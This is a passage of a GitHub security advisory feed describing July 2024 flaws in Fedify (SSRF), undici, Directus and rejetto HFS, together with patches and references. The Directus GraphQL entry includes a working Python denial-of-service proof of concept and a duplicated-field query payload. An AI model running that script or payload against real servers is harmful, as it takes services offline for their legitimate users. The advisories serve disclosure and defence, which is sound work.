        <id>https://github.com/advisories/GHSA-p9cg-vqcc-grcx</id>
        <link href="https://github.com/advisories/GHSA-p9cg-vqcc-grcx"/>
        <updated>2024-07-09T13:58:14.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>At present, when Fedify needs to retrieve an object or activity from a remote activitypub server, it makes a HTTP request to the <code>@id</code> or other resources present within the activity it has received from the web. This activity could reference an <code>@id</code> that points to an internal IP address, allowing an attacker to send request to resources internal to the fedify server's network.</p>
<p>This applies to not just resolution of documents containing activities or objects, but also to media URLs as well.</p>
<p>Specifically this is a <a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery">Server Side Request Forgery attack</a>. You can learn more about SSRF attacks via <a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918</a></p>
<h3 id="details">Details</h3>
<p>When Fedify makes a request at runtime via the DocLoader [1] [2], the <code>fetch</code> API does not first check the URI's to assert that it resolve to a public IP address. Additionally, any downstream software of Fedify that may fetch data from URIs contained within Activities or Objects maybe be at risk of requesting non-public resources, and storing those, exposing non-public information to the public.</p>
<p>Additionally, in many cases the URIs are not asserted to be either strictly HTTPS or HTTP protocols, which could lead to further attacks, and there is no check that the URI contains a <code>hostname</code> part. Whilst the <a href="https://fetch.spec.whatwg.org/"><code>fetch()</code> specification</a> may provide some safety here, along with underlying fetch implementations, there is still potential for attacks through using <code>data:</code> URIs, or just attacking some other protocol entirely, e.g., FTP or CalDav.</p>
<p>[1] <a href="https://github.com/dahlia/fedify/blob/main/runtime/docloader.ts#L141">https://github.com/dahlia/fedify/blob/main/runtime/docloader.ts#L141</a>
[2] <a href="https://github.com/dahlia/fedify/blob/main/runtime/docloader.ts#L175">https://github.com/dahlia/fedify/blob/main/runtime/docloader.ts#L175</a></p>
<h4 id="deno-specific-attack-vectors">Deno-specific Attack Vectors</h4>
<p>In Deno specifically, the <code>fetch()</code> API allows <a href="https://docs.deno.com/deploy/api/runtime-fetch/">accessing local filesystem</a>, I'm not sure how Deno's <a href="https://docs.deno.com/runtime/manual/runtime/permission_apis/">Permissions model</a> may prevent attacks utilising <code>file:</code> URIs.</p>
<blockquote>
<p>Fetch also supports fetching from file URLs to retrieve static files. For more info on static files, see the <a href="https://docs.deno.com/deploy/api/runtime-fs">filesystem API documentation</a>.</p>
</blockquote>
<h4 id="activitypub-security-considerations">ActivityPub Security Considerations</h4>
<p>This is also noted in the ActivityPub spec in <a href="https://www.w3.org/TR/activitypub/#security-localhost">Section B.3 Security Considerations</a>, however, there it is more limited in scope.</p>
<h4 id="other-implementations">Other Implementations</h4>
<p>It may be acceptable to allow a server operator to allow access to given non-public IP addresses, for instance <a href="https://github.com/mastodon/mastodon/blob/092bb8a27af9ee87ff9ebabaf354477470ea3a94/app/lib/request.rb#L330">in Mastodon</a> they allow requests to non-public IP addresses, i.e., localhost in development and those in the <code>ALLOWED_PRIVATE_ADDRESSES</code> environment variable.</p>
<h3 id="poc">PoC</h3>
<p>I'm not sure a PoC is necessary given this is a reasonably well known vulnerability vector.</p>
<h3 id="impact">Impact</h3>
<p>This impacts server operates, as resources that are internal to their network may find themselves being improperly accessed or potentially even attacked or exposed to the public.</p>
<h3 id="notes-for-resolution">Notes for resolution:</h3>
<p>When implementing public IP address validation, be careful of <a href="https://cwe.mitre.org/data/definitions/1389.html">CWE-1389</a> and <a href="https://cwe.mitre.org/data/definitions/1286.html">CWE-1286</a> both of which <a href="https://github.com/advisories/GHSA-78xj-cgh5-2h22">recently</a> caused a CVE to be filed against the popular node.js <code>ip</code> package, although this package was not originally intended for security purposes.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/dahlia/fedify/security/advisories/GHSA-p9cg-vqcc-grcx">https://github.com/dahlia/fedify/security/advisories/GHSA-p9cg-vqcc-grcx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39687">https://nvd.nist.gov/vuln/detail/CVE-2024-39687</a></li>
<li><a href="https://github.com/dahlia/fedify/commit/30f9cf4a175704a04c874f3ea88414c5f1e00b28">https://github.com/dahlia/fedify/commit/30f9cf4a175704a04c874f3ea88414c5f1e00b28</a></li>
<li><a href="https://github.com/dahlia/fedify/commit/c641e976089dd913f649889c1bfb016df04e86ba">https://github.com/dahlia/fedify/commit/c641e976089dd913f649889c1bfb016df04e86ba</a></li>
<li><a href="https://github.com/dahlia/fedify/releases/tag/0.11.1">https://github.com/dahlia/fedify/releases/tag/0.11.1</a></li>
<li><a href="https://github.com/advisories/GHSA-p9cg-vqcc-grcx">https://github.com/advisories/GHSA-p9cg-vqcc-grcx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-p9cg-vqcc-grcx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-05T20:07:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[undici] Undici vulnerable to data leak when using response.arrayBuffer()]]></title>
        <id>https://github.com/advisories/GHSA-3g92-w8c5-73pq</id>
        <link href="https://github.com/advisories/GHSA-3g92-w8c5-73pq"/>
        <updated>2024-07-09T13:32:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Depending on network and process conditions of a <code>fetch()</code> request, <code>response.arrayBuffer()</code> might include portion of memory from the Node.js process.</p>
<h3 id="patches">Patches</h3>
<p>This has been patched in v6.19.2.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no known workaround.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/nodejs/undici/issues/3337">https://github.com/nodejs/undici/issues/3337</a>
<a href="https://github.com/nodejs/undici/issues/3328">https://github.com/nodejs/undici/issues/3328</a>
<a href="https://github.com/nodejs/undici/pull/3338">https://github.com/nodejs/undici/pull/3338</a>
<a href="https://github.com/nodejs/undici/commit/f979ec3204ca489abf30e7d20e9fee9ea7711d36">https://github.com/nodejs/undici/commit/f979ec3204ca489abf30e7d20e9fee9ea7711d36</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/nodejs/undici/security/advisories/GHSA-3g92-w8c5-73pq">https://github.com/nodejs/undici/security/advisories/GHSA-3g92-w8c5-73pq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-38372">https://nvd.nist.gov/vuln/detail/CVE-2024-38372</a></li>
<li><a href="https://github.com/nodejs/undici/issues/3328">https://github.com/nodejs/undici/issues/3328</a></li>
<li><a href="https://github.com/nodejs/undici/issues/3337">https://github.com/nodejs/undici/issues/3337</a></li>
<li><a href="https://github.com/nodejs/undici/pull/3338">https://github.com/nodejs/undici/pull/3338</a></li>
<li><a href="https://github.com/nodejs/undici/commit/f979ec3204ca489abf30e7d20e9fee9ea7711d36">https://github.com/nodejs/undici/commit/f979ec3204ca489abf30e7d20e9fee9ea7711d36</a></li>
<li><a href="https://github.com/advisories/GHSA-3g92-w8c5-73pq">https://github.com/advisories/GHSA-3g92-w8c5-73pq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3g92-w8c5-73pq</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-07-09T13:32:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[directus] Directus Allows Single Sign-On User Enumeration]]></title>
        <id>https://github.com/advisories/GHSA-jgf4-vwc3-r46v</id>
        <link href="https://github.com/advisories/GHSA-jgf4-vwc3-r46v"/>
        <updated>2024-07-08T18:41:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When relying on SSO providers in combination with local authentication it can be possible to enumerate existing SSO users in the instance. This is possible because if an email address exists in Directus and belongs to a known SSO provider then it will throw a "helpful" error that the user belongs to another provider.</p>
<h3 id="reproduction">Reproduction</h3>
<ol>
<li>Create a user using a SSO provider <code>test@directus.io</code>.</li>
<li>Try to log-in using the regular login form (or the API)</li>
<li>When using a valid email address</li>
</ol>
<table>
<thead>
<tr>
<th><strong>APP</strong></th>
<th><strong>API</strong></th>
</tr>
</thead>
<tbody><tr>
<td><img alt="image" src="https://github.com/directus/directus/assets/9389634/1da3301d-226f-46a7-bfb8-3f6fb9bc55cd"></td>
<td><img alt="image" src="https://github.com/directus/directus/assets/9389634/50cab310-7d1c-4241-a6be-d06542565767"></td>
</tr>
</tbody></table>
<ol start="4">
<li>When using an invalid email address</li>
</ol>
<table>
<thead>
<tr>
<th><strong>APP</strong></th>
<th><strong>API</strong></th>
</tr>
</thead>
<tbody><tr>
<td><img alt="image" src="https://github.com/directus/directus/assets/9389634/7b97659e-b49c-410b-872e-e36786b6e41e"></td>
<td><img alt="image" src="https://github.com/directus/directus/assets/9389634/d26ccba7-bb27-437e-991e-99c10941bbe7"></td>
</tr>
</tbody></table>
<ol start="5">
<li>Using this differing error it is possible to determine whether a specific email address is present in the Directus instance as an SSO user.</li>
</ol>
<h3 id="workarounds">Workarounds</h3>
<p>When only using SSO for authentication then you can work around this issue by disabling local login using the following environment variable <code>AUTH_DISABLE_DEFAULT="true"</code></p>
<h3 id="references">References</h3>
<p>Implemented as feature in <a href="https://github.com/directus/directus/pull/13184">https://github.com/directus/directus/pull/13184</a>
<a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account">https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-jgf4-vwc3-r46v">https://github.com/directus/directus/security/advisories/GHSA-jgf4-vwc3-r46v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39896">https://nvd.nist.gov/vuln/detail/CVE-2024-39896</a></li>
<li><a href="https://github.com/directus/directus/commit/454cb534d6ffa547feb11f4d74b932ae7368dae2">https://github.com/directus/directus/commit/454cb534d6ffa547feb11f4d74b932ae7368dae2</a></li>
<li><a href="https://github.com/advisories/GHSA-jgf4-vwc3-r46v">https://github.com/advisories/GHSA-jgf4-vwc3-r46v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jgf4-vwc3-r46v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-08T18:41:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@directus/env] Directus GraphQL Field Duplication Denial of Service (DoS)]]></title>
        <id>https://github.com/advisories/GHSA-7hmh-pfrp-vcx4</id>
        <link href="https://github.com/advisories/GHSA-7hmh-pfrp-vcx4"/>
        <updated>2024-07-08T18:41:00.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A denial of service (DoS) attack by field duplication in GraphQL is a type of attack where an attacker exploits the flexibility of GraphQL to overwhelm a server by requesting the same field multiple times in a single query. This can cause the server to perform redundant computations and consume excessive resources, leading to a denial of service for legitimate users.</p>
<h3 id="details">Details</h3>
<p>Request to the endpoint /graphql are sent when visualizing graphs generated at a dashboard:
<img alt="image" src="https://github.com/directus/directus/assets/114263468/185eb60f-9092-47d4-81f4-add1a53e99c8"></p>
<p><img alt="DoS5" src="https://github.com/directus/directus/assets/114263468/f43079f5-b9ab-4704-938f-dcb91453d464"></p>
<p>By modifying the data sent and duplicating many times the fields a DoS attack is possible. </p>
<h3 id="poc">PoC</h3>
<p>The goal is to create a payload that generates a body like this, where the 'max' field is duplicated many times, each with the 'id' field duplicated many times inside it.
<code>{'query': 'query { query_4f4722ea: test_table_aggregated { max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  }  } }'}</code></p>
<p>Although that payload seems harmless, a bigger one leaves the service unresponsive. </p>
<p>The following code might serve as a PoC written in Python3:</p>
<pre><code class="language-#"># GitHub @asantof

import requests

## CHANGE THIS VALUES: url, auth_token, query_name, collection_name
url = 'http://0.0.0.0:8055/graphql'
auth_token = '' 
query_name = 'query_XXXXX' 
collection_name = ''  

headers = {
    'Content-Type': 'application/json',
    'Authorization': f'Bearer {auth_token}',
}

id_payload = 'id ' * 200
max_payload = 'max {' + id_payload + ' } '
full_payload = max_payload * 200

data = {
    'query': 'query { ' + query_name + ': ' + collection_name + '_aggregated { ' + full_payload + ' } }'
}

print(data)

response = requests.post(url, headers=headers, json=data)

print(response.json())
</code></pre>
<p><img alt="DoS4" src="https://github.com/directus/directus/assets/114263468/965e50bc-24dc-405c-a0f1-c973bd4f378d"></p>
<p>After running it the service will be unresponsive for a while:
<img alt="DoS" src="https://github.com/directus/directus/assets/114263468/9865acc1-9b82-4d3d-8929-cf32500ce14d"></p>
<h3 id="impact">Impact</h3>
<p>The vulnerability impacts the service's availability by causing it to become unresponsive for a few minutes. An attacker could continuously send this request to the server, rendering the service unavailable indefinitely.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-7hmh-pfrp-vcx4">https://github.com/directus/directus/security/advisories/GHSA-7hmh-pfrp-vcx4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39895">https://nvd.nist.gov/vuln/detail/CVE-2024-39895</a></li>
<li><a href="https://github.com/directus/directus/commit/543b345695071c1de61a35004bd063fe59dba0c8">https://github.com/directus/directus/commit/543b345695071c1de61a35004bd063fe59dba0c8</a></li>
<li><a href="https://github.com/advisories/GHSA-7hmh-pfrp-vcx4">https://github.com/advisories/GHSA-7hmh-pfrp-vcx4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7hmh-pfrp-vcx4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-08T18:41:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[hfs] rejetto HFS vulnerable to OS Command Execution by remote authenticated users]]></title>
        <id>https://github.com/advisories/GHSA-5f4x-hwv2-w9w2</id>
        <link href="https://github.com/advisories/GHSA-5f4x-hwv2-w9w2"/>
        <updated>2024-07-08T18:38:40.000Z</updated>
        <content type="html"><![CDATA[<p>rejetto HFS (aka HTTP File Server) 3 before 0.52.10 on Linux, UNIX, and macOS allows OS command execution by remote authenticated users (if they have Upload permissions). This occurs because a shell is used to execute df (i.e., with execSync instead of spawnSync in child_process in Node.js).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-39943">https://nvd.nist.gov/vuln/detail/CVE-2024-39943</a></li>
<li><a href="https://github.com/rejetto/hfs/commit/305381bd36eee074fb238b64302a252668daad1d">https://github.com/rejetto/hfs/commit/305381bd36eee074fb238b64302a252668daad1d</a></li>
<li><a href="https://github.com/rejetto/hfs/compare/v0.52.9...v0.52.10">https://github.com/rejetto/hfs/compare/v0.52.9...v0.52.10</a></li>
<li><a href="https://www.rejetto.com/wiki/index.php/HFS:_Working_with_uploads">https://www.rejetto.com/wiki/index.php/HFS:_Working_with_uploads</a></li>
<li><a href="https://github.com/advisories/GHSA-5f4x-hwv2-w9w2">https://github.com/advisories/GHSA-5f4x-hwv2-w9w2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5f4x-hwv2-w9w2</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-07-05T00:31:07.000Z</published>
    </entry>
</feed>